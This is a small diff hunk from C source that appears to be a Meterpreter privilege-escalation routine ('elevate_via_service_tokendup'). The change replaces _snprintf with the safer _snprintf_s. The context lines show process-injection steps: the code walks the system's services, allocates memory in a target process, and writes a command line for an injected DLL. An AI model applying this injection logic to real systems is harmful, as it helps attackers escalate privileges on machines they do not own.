@@ -141,7 +141,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 
 				dprintf( "[ELEVATE] elevate_via_service_debug. trying [%d] lpDisplayName=%s, lpServiceName=%s, dwProcessId=%d", index, lpServices[index].lpDisplayName, lpServices[index].lpServiceName, status.dwProcessId  );
 	
-				_snprintf( cCommandLine, sizeof(cCommandLine), "/t:0x%08X\x00", GetCurrentThreadId() );
+				_snprintf_s( cCommandLine, sizeof(cCommandLine), sizeof(cCommandLine), "/t:0x%08X\x00", GetCurrentThreadId() );
 
 				// alloc some space and write the commandline which we will pass to the injected dll...
 				lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
